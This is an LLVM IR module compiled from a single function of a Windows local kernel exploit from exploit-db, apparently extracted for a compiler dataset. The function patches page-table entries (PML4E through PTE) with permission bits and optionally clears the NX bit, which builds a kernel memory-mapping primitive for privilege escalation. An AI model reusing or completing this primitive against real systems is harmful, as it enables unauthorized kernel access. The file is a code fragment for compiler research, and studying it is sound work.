; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_41015.c_create_spurious_pte_to_virtual_address.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_41015.c_create_spurious_pte_to_virtual_address.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [35 x i8] c"[+] Selected spurious PML4E: %llx\0A\00", align 1
@.str.1 = private unnamed_addr constant [23 x i8] c"[+] Spurious PT: %llx\0A\00", align 1
@.str.2 = private unnamed_addr constant [53 x i8] c"--------------------------------------------------\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [30 x i8] c"[+] Content pml4e %llx: %llx\0A\00", align 1
@.str.4 = private unnamed_addr constant [53 x i8] c"[+] Patching the Spurious Offset (PML4e) %llx: %llx\0A\00", align 1
@.str.5 = private unnamed_addr constant [30 x i8] c"[+] Content pdpte %llx: %llx\0A\00", align 1
@.str.6 = private unnamed_addr constant [53 x i8] c"[+] Patching the Spurious Offset (PDPTE) %llx: %llx\0A\00", align 1
@.str.7 = private unnamed_addr constant [29 x i8] c"[+] Content pdpe %llx: %llx\0A\00", align 1
@.str.8 = private unnamed_addr constant [51 x i8] c"[+] Patching the Spurious Offset (PDE) %llx: %llx\0A\00", align 1
@.str.9 = private unnamed_addr constant [28 x i8] c"[+] Content pte %llx: %llx\0A\00", align 1
@.str.10 = private unnamed_addr constant [52 x i8] c"*** Patching the original location to enable NX...\0A\00", align 1
@.str.11 = private unnamed_addr constant [51 x i8] c"[+] Patching the Spurious Offset (PTE) %llx: %llx\0A\00", align 1
@.str.12 = private unnamed_addr constant [3 x i8] c"\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @create_spurious_pte_to_virtual_address(i32 %0, i64 %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i64, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i64 %1, i64* %4, align 8
  %22 = load i32, i32* %3, align 4
  %23 = call i32 @get_pxe_address(i32 %22)
  store i32 %23, i32* %5, align 4
  %24 = load i32, i32* %5, align 4
  %25 = and i32 %24, 4095
  store i32 %25, i32* %6, align 4
  %26 = load i32, i32* %5, align 4
  %27 = call i32 @get_pxe_address(i32 %26)
  store i32 %27, i32* %7, align 4
  %28 = load i32, i32* %7, align 4
  %29 = and i32 %28, 4095
  store i32 %29, i32* %8, align 4
  %30 = load i32, i32* %7, align 4
  %31 = call i32 @get_pxe_address(i32 %30)
  store i32 %31, i32* %9, align 4
  %32 = load i32, i32* %9, align 4
  %33 = and i32 %32, 4095
  store i32 %33, i32* %10, align 4
  %34 = load i32, i32* %9, align 4
  %35 = call i32 @get_pxe_address(i32 %34)
  store i32 %35, i32* %11, align 4
  %36 = load i32, i32* %11, align 4
  %37 = and i32 %36, 4095
  store i32 %37, i32* %12, align 4
  %38 = call i32 (...) @look_free_entry_pml4()
  store i32 %38, i32* %13, align 4
  %39 = load i32, i32* %13, align 4
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str, i64 0, i64 0), i32 %39)
  %41 = load i32, i32* %13, align 4
  store i32 %41, i32* %14, align 4
  %42 = load i32, i32* %13, align 4
  %43 = call i32 @calculate_spurious_pt_address(i32 %42)
  store i32 %43, i32* %15, align 4
  %44 = load i32, i32* %15, align 4
  %45 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.1, i64 0, i64 0), i32 %44)
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.2, i64 0, i64 0))
  %47 = load i32, i32* %11, align 4
  %48 = sext i32 %47 to i64
  %49 = inttoptr i64 %48 to i64*
  %50 = load i64, i64* %49, align 8
  %51 = trunc i64 %50 to i32
  store i32 %51, i32* %16, align 4
  %52 = load i32, i32* %11, align 4
  %53 = load i32, i32* %16, align 4
  %54 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.3, i64 0, i64 0), i32 %52, i32 %53)
  %55 = load i32, i32* %16, align 4
  %56 = or i32 %55, 103
  store i32 %56, i32* %16, align 4
  %57 = load i32, i32* %14, align 4
  %58 = load i32, i32* %16, align 4
  %59 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.4, i64 0, i64 0), i32 %57, i32 %58)
  %60 = load i32, i32* %16, align 4
  %61 = sext i32 %60 to i64
  %62 = load i32, i32* %13, align 4
  %63 = sext i32 %62 to i64
  %64 = inttoptr i64 %63 to i64*
  store i64 %61, i64* %64, align 8
  %65 = call i32 @Sleep(i32 1)
  %66 = load i32, i32* %15, align 4
  %67 = load i32, i32* %10, align 4
  %68 = add nsw i32 %66, %67
  %69 = sext i32 %68 to i64
  %70 = inttoptr i64 %69 to i64*
  %71 = load i64, i64* %70, align 8
  %72 = trunc i64 %71 to i32
  store i32 %72, i32* %17, align 4
  %73 = load i32, i32* %9, align 4
  %74 = load i32, i32* %17, align 4
  %75 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.5, i64 0, i64 0), i32 %73, i32 %74)
  %76 = load i32, i32* %17, align 4
  %77 = or i32 %76, 103
  store i32 %77, i32* %17, align 4
  %78 = load i32, i32* %13, align 4
  %79 = load i32, i32* %17, align 4
  %80 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.6, i64 0, i64 0), i32 %78, i32 %79)
  %81 = load i32, i32* %17, align 4
  %82 = sext i32 %81 to i64
  %83 = load i32, i32* %13, align 4
  %84 = sext i32 %83 to i64
  %85 = inttoptr i64 %84 to i64*
  store i64 %82, i64* %85, align 8
  %86 = call i32 @Sleep(i32 1)
  %87 = load i32, i32* %15, align 4
  %88 = load i32, i32* %8, align 4
  %89 = add nsw i32 %87, %88
  store i32 %89, i32* %18, align 4
  %90 = load i32, i32* %15, align 4
  %91 = load i32, i32* %8, align 4
  %92 = add nsw i32 %90, %91
  %93 = sext i32 %92 to i64
  %94 = inttoptr i64 %93 to i64*
  %95 = load i64, i64* %94, align 8
  %96 = trunc i64 %95 to i32
  store i32 %96, i32* %19, align 4
  %97 = load i32, i32* %7, align 4
  %98 = load i32, i32* %19, align 4
  %99 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.7, i64 0, i64 0), i32 %97, i32 %98)
  %100 = load i32, i32* %19, align 4
  %101 = or i32 %100, 103
  store i32 %101, i32* %19, align 4
  %102 = load i32, i32* %13, align 4
  %103 = load i32, i32* %19, align 4
  %104 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.8, i64 0, i64 0), i32 %102, i32 %103)
  %105 = load i32, i32* %19, align 4
  %106 = sext i32 %105 to i64
  %107 = load i32, i32* %13, align 4
  %108 = sext i32 %107 to i64
  %109 = inttoptr i64 %108 to i64*
  store i64 %106, i64* %109, align 8
  %110 = call i32 @Sleep(i32 1)
  %111 = load i32, i32* %15, align 4
  %112 = load i32, i32* %6, align 4
  %113 = add nsw i32 %111, %112
  store i32 %113, i32* %20, align 4
  %114 = load i32, i32* %15, align 4
  %115 = load i32, i32* %6, align 4
  %116 = add nsw i32 %114, %115
  %117 = sext i32 %116 to i64
  %118 = inttoptr i64 %117 to i64*
  %119 = load i64, i64* %118, align 8
  %120 = trunc i64 %119 to i32
  store i32 %120, i32* %21, align 4
  %121 = load i32, i32* %5, align 4
  %122 = load i32, i32* %21, align 4
  %123 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.9, i64 0, i64 0), i32 %121, i32 %122)
  %124 = load i32, i32* %21, align 4
  %125 = or i32 %124, 103
  store i32 %125, i32* %21, align 4
  %126 = load i32, i32* %21, align 4
  %127 = sext i32 %126 to i64
  %128 = and i64 %127, 9223372036854775807
  %129 = trunc i64 %128 to i32
  store i32 %129, i32* %21, align 4
  %130 = load i64, i64* %4, align 8
  %131 = icmp ne i64 %130, 0
  br i1 %131, label %132, label %141

132:                                              ; preds = %2
  %133 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.10, i64 0, i64 0))
  %134 = load i32, i32* %21, align 4
  %135 = sext i32 %134 to i64
  %136 = load i32, i32* %15, align 4
  %137 = load i32, i32* %6, align 4
  %138 = add nsw i32 %136, %137
  %139 = sext i32 %138 to i64
  %140 = inttoptr i64 %139 to i64*
  store i64 %135, i64* %140, align 8
  br label %141

141:                                              ; preds = %132, %2
  %142 = load i32, i32* %13, align 4
  %143 = load i32, i32* %21, align 4
  %144 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.11, i64 0, i64 0), i32 %142, i32 %143)
  %145 = load i32, i32* %21, align 4
  %146 = sext i32 %145 to i64
  %147 = load i32, i32* %13, align 4
  %148 = sext i32 %147 to i64
  %149 = inttoptr i64 %148 to i64*
  store i64 %146, i64* %149, align 8
  %150 = call i32 @Sleep(i32 1)
  %151 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.12, i64 0, i64 0))
  %152 = load i32, i32* %15, align 4
  ret i32 %152
}

declare dso_local i32 @get_pxe_address(i32) #1

declare dso_local i32 @look_free_entry_pml4(...) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @calculate_spurious_pt_address(i32) #1

declare dso_local i32 @Sleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
